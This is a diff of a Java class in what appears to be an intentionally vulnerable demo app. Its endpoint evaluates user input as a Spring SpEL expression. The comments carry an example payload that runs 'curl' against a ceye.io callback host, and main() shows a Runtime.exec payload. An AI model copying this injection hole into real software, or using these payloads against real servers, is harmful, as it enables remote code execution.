@@ -20,18 +20,18 @@ public class SpEL {
      * xxx is urlencode(exp)
      * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
      */
-    @RequestMapping("/spel/vul")
-    private static String rce(String expression) {
+    @RequestMapping("/spel/vuln")
+    public String rce(String expression) {
         ExpressionParser parser = new SpelExpressionParser();
         // fix method: SimpleEvaluationContext
-        String result = parser.parseExpression(expression).getValue().toString();
-        return result;
+        return parser.parseExpression(expression).getValue().toString();
     }
 
-    public static void main(String[] args)  {
+    public static void main(String[] args) {
         ExpressionParser parser = new SpelExpressionParser();
         String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
         String result = parser.parseExpression(expression).getValue().toString();
+        System.out.println(result);
     }
 }
 
